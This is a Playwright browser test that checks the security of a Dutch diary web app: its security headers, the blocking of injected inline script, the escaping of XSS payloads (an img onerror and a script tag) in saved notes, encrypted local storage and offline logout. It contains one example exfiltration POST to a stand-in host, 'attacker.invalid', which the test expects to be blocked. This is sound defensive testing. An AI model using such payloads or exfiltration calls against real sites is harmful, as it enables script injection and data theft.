import {accountFixture} from './fixtures/account.mjs';
import assert from 'node:assert/strict';
import path from 'node:path';
import { chromium } from 'playwright';
import { createPhonePreviewServer } from '../scripts/phone-preview-server.mjs';

const server=createPhonePreviewServer(path.resolve('apps/prototype-web/dist'),()=>null);
await new Promise(resolve=>server.listen(0,'127.0.0.1',resolve));
const base=`http://127.0.0.1:${server.address().port}`, browser=await chromium.launch({channel:'msedge',headless:true});
try {
  const context=await browser.newContext({viewport:{width:390,height:844},reducedMotion:'reduce'});
  await accountFixture(context);
  const page=await context.newPage();page.setDefaultTimeout(12000);
  const errors=[];page.on('pageerror',e=>errors.push(e.message));
  await page.clock.setFixedTime(new Date('2026-11-15T18:00:00Z'));
  const response=await page.goto(base), headers=response.headers();
  assert.match(headers['content-security-policy'],/frame-ancestors 'none'/);assert.ok(!headers['content-security-policy'].includes("'unsafe-eval'"));assert.equal(headers['x-frame-options'],'DENY');
  assert.match(headers['strict-transport-security'],/max-age=31536000/);assert.match(headers['permissions-policy'],/camera=\(\)/);
  await page.evaluate(()=>{const script=document.createElement('script');script.textContent='window.inlineScriptExecuted=true';document.body.append(script);});
  assert.equal(await page.evaluate(()=>window.inlineScriptExecuted),undefined,'Inline script must be blocked');
  assert.equal(await page.evaluate(async()=>{try{await fetch('https://attacker.invalid/exfiltrate',{method:'POST',body:'SYNTHETIC'});return true;}catch{return false;}}),false,'Unapproved network destinations must be blocked');
  await page.locator('.app-shell').waitFor();
  await page.getByRole('navigation',{name:'Mobiele navigatie'}).getByRole('button',{name:'Dagboek',exact:true}).click();
  await page.getByRole('button',{name:'Notitie schrijven',exact:true}).click();
  const note='PRIVATE-XSS <img src=x onerror="window.noteExecuted=true"> <script>window.noteExecuted=true</script>';
  await page.getByLabel('Wat wil je onthouden?',{exact:true}).fill(note);await page.getByRole('button',{name:'Bewaar mijn notitie',exact:true}).click();await page.getByRole('dialog').waitFor({state:'hidden'});
  await page.getByText(note,{exact:true}).waitFor();assert.equal(await page.locator('.journal-entry script,.journal-entry img').count(),0);assert.equal(await page.evaluate(()=>window.noteExecuted),undefined);

  assert.ok(!(await page.evaluate(()=>JSON.stringify(localStorage))).includes('PRIVATE-XSS'));
  const encrypted=await page.evaluate(async()=>{const db=await new Promise((resolve,reject)=>{const r=indexedDB.open('rhythm-accounts',1);r.onsuccess=()=>resolve(r.result);r.onerror=()=>reject(r.error);});const rows=await new Promise(resolve=>{const r=db.transaction('accounts').objectStore('accounts').getAll();r.onsuccess=()=>resolve(r.result);});db.close();return {count:rows.length,plaintext:rows.some(r=>new TextDecoder().decode(r.cipher).includes('PRIVATE-XSS')),exportable:rows.some(r=>r.key.extractable)};});
  assert.equal(encrypted.count,1);assert.equal(encrypted.plaintext,false);assert.equal(encrypted.exportable,false);
  await context.setOffline(true);
  await page.getByRole('navigation',{name:'Mobiele navigatie'}).getByRole('button',{name:'Meer',exact:true}).click();await page.getByRole('button',{name:'Uitloggen',exact:true}).click();await page.getByRole('heading',{name:'Welkom terug',exact:true}).waitFor();
  assert.ok(!(await page.locator('body').innerText()).includes('PRIVATE-XSS'),'Logout removes diary from UI');
  assert.equal(await page.evaluate(()=>localStorage.getItem('rhythm.auth.v1')),null,'Local logout must not depend on network');
  assert.deepEqual(errors,[]);
  console.log('Security browser checks passed: enforced headers/CSP, blocked script and exfiltration destination, escaped journal payloads, offline logout, nonextractable encrypted device cache and no plaintext diary in localStorage.');
} finally {await browser.close();await new Promise(resolve=>server.close(resolve));}
